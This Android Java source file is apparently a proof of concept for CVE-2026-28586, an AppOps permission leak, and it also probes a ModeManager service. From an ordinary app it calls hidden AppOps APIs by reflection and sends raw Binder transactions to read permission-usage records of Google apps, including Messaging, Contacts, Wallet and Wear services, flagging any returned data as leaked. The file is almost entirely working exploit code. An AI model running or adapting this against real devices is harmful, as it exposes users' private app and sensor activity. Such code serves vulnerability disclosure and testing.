package com.vrp.poc;

import android.app.Activity;
import android.app.AppOpsManager;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.TextView;
import java.lang.reflect.Method;
import java.util.List;

public class AppOpsLeakActivity extends Activity {
    private static final String TAG = "VRP_APPOPS";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        final TextView tv = new TextView(this);
        tv.setPadding(16, 16, 16, 16);
        tv.setTextSize(8f);
        sv.addView(tv);
        setContentView(sv);

        new Thread(() -> {
            StringBuilder sb = new StringBuilder();
            sb.append("=== CVE-2026-28586: AppOps Permission Leak ===\n");
            sb.append("PoC UID: ").append(android.os.Process.myUid()).append("\n");
            sb.append("PID: ").append(android.os.Process.myPid()).append("\n\n");

            try {
                AppOpsManager aom = (AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);

                String[] targets = {
                    "com.google.android.gms",
                    "com.google.android.apps.messaging",
                    "com.google.android.contacts",
                    "com.google.android.calendar",
                    "com.google.android.apps.walletnfcrel",
                    "com.google.wear.services",
                    "com.google.android.wearable.app"
                };

                for (String pkg : targets) {
                    sb.append("--- ").append(pkg).append(" ---\n");
                    try {
                        int uid = getPackageManager().getApplicationInfo(pkg, 0).uid;
                        sb.append("  UID: ").append(uid).append("\n");

                        // Try reflection to call getOpsForPackage
                        try {
                            Method getOps = AppOpsManager.class.getMethod(
                                "getOpsForPackage", int.class, String.class, int[].class);
                            Object result = getOps.invoke(aom, uid, pkg, null);
                            if (result != null) {
                                List<?> entries = (List<?>) result;
                                sb.append("  OPS RETURNED: ").append(entries.size()).append(" entries\n");
                                for (Object entry : entries) {
                                    sb.append("    ").append(entry.toString()).append("\n");
                                }
                                Log.i(TAG, "LEAK: " + pkg + " returned " + entries.size() + " op entries");
                            } else {
                                sb.append("  getOpsForPackage: null\n");
                            }
                        } catch (Exception e) {
                            sb.append("  getOpsForPackage: ").append(e.getClass().getSimpleName())
                              .append(": ").append(e.getMessage()).append("\n");
                            Log.w(TAG, pkg + " getOps failed", e);
                        }

                        // Try getPackagesForOps - lists all packages that performed specific ops
                        try {
                            Method getPkgs = AppOpsManager.class.getMethod(
                                "getPackagesForOps", int[].class);
                            int[] interestingOps = {0, 1, 2, 26, 27, 40, 41, 42, 43, 44, 79, 80};
                            Object result = getPkgs.invoke(aom, interestingOps);
                            if (result != null) {
                                List<?> entries = (List<?>) result;
                                sb.append("  getPackagesForOps: ").append(entries.size()).append(" entries\n");
                                for (Object entry : entries) {
                                    sb.append("    ").append(entry.toString()).append("\n");
                                }
                                Log.i(TAG, "LEAK_PKGS: returned " + entries.size() + " entries");
                            }
                        } catch (Exception e) {
                            sb.append("  getPackagesForOps: ").append(e.getClass().getSimpleName())
                              .append(": ").append(e.getMessage()).append("\n");
                        }

                    } catch (PackageManager.NameNotFoundException e) {
                        sb.append("  NOT INSTALLED\n");
                    }
                    sb.append("\n");
                }

                // Also test ModeManager via reflection
                sb.append("--- ModeManager (CVE-2026-49883) ---\n");
                try {
                    Class<?> smClass = Class.forName("android.os.ServiceManager");
                    Method getService = smClass.getMethod("getService", String.class);
                    IBinder modeBinder = (IBinder) getService.invoke(null, "ModeManager");
                    if (modeBinder != null) {
                        sb.append("ModeManager service found\n");
                        sb.append("Binder interface: ").append(modeBinder.getInterfaceDescriptor()).append("\n");
                        for (int txn = 1; txn <= 10; txn++) {
                            Parcel data = Parcel.obtain();
                            Parcel reply = Parcel.obtain();
                            try {
                                data.writeInterfaceToken("com.android.clockwork.modes.IModeManager");
                                boolean r = modeBinder.transact(txn, data, reply, 0);
                                sb.append("Txn ").append(txn).append(": transact=").append(r);
                                reply.setDataPosition(0);
                                try {
                                    reply.readException();
                                    int remaining = reply.dataAvail();
                                    sb.append(", data_avail=").append(remaining);
                                    if (remaining > 0) {
                                        sb.append(", SUCCESS");
                                        byte[] raw = new byte[Math.min(remaining, 256)];
                                        reply.readByteArray(raw);
                                        sb.append(", raw_hex=");
                                        for (byte b : raw) sb.append(String.format("%02x", b));
                                        Log.i(TAG, "MODE_TXN_" + txn + ": SUCCESS, bytes=" + remaining);
                                    }
                                } catch (Exception ex) {
                                    sb.append(", exc=").append(ex.getMessage());
                                }
                                sb.append("\n");
                            } catch (Exception e) {
                                sb.append("Txn ").append(txn).append(": ERROR ").append(e.getMessage()).append("\n");
                            } finally {
                                data.recycle();
                                reply.recycle();
                            }
                        }
                    } else {
                        sb.append("ModeManager service NOT found\n");
                    }
                } catch (Exception e) {
                    sb.append("ModeManager error: ").append(e.getMessage()).append("\n");
                }

                // Test appops via Binder directly too
                sb.append("\n--- AppOps via Binder (direct) ---\n");
                try {
                    Class<?> smClass = Class.forName("android.os.ServiceManager");
                    Method getService = smClass.getMethod("getService", String.class);
                    IBinder aoBinder = (IBinder) getService.invoke(null, "appops");
                    if (aoBinder != null) {
                        sb.append("appops service found\n");
                        sb.append("Interface: ").append(aoBinder.getInterfaceDescriptor()).append("\n");
                        // getOpsForPackage is transaction 3 in IAppOpsService
                        // Args: int uid, String packageName, int[] ops
                        String[] testPkgs = {"com.google.android.gms", "com.google.wear.services"};
                        for (String pkg : testPkgs) {
                            try {
                                int uid = getPackageManager().getApplicationInfo(pkg, 0).uid;
                                Parcel data = Parcel.obtain();
                                Parcel reply = Parcel.obtain();
                                try {
                                    data.writeInterfaceToken("com.android.internal.app.IAppOpsService");
                                    data.writeInt(uid);
                                    data.writeString(pkg);
                                    data.writeInt(-1); // null ops array
                                    boolean r = aoBinder.transact(3, data, reply, 0);
                                    reply.setDataPosition(0);
                                    try {
                                        reply.readException();
                                        int remaining = reply.dataAvail();
                                        sb.append(pkg).append(" (uid=").append(uid).append("): avail=")
                                          .append(remaining);
                                        if (remaining > 0) {
                                            int listSize = reply.readInt();
                                            sb.append(", list_size=").append(listSize);
                                            if (listSize > 0) {
                                                sb.append(" LEAKED!");
                                                Log.i(TAG, "APPOPS_BINDER_LEAK: " + pkg + " list_size=" + listSize);
                                            }
                                        }
                                        sb.append("\n");
                                    } catch (Exception ex) {
                                        sb.append(pkg).append(": SecurityException=").append(ex.getMessage()).append("\n");
                                        Log.i(TAG, "APPOPS " + pkg + ": " + ex.getMessage());
                                    }
                                } finally {
                                    data.recycle();
                                    reply.recycle();
                                }
                            } catch (PackageManager.NameNotFoundException e) {
                                sb.append(pkg).append(": NOT INSTALLED\n");
                            }
                        }
                    }
                } catch (Exception e) {
                    sb.append("appops binder error: ").append(e.getMessage()).append("\n");
                }

            } catch (Exception e) {
                sb.append("FATAL: ").append(e.getMessage()).append("\n");
                Log.e(TAG, "Fatal", e);
            }

            final String result = sb.toString();
            Log.i(TAG, result);
            runOnUiThread(() -> tv.setText(result));
        }).start();
    }
}
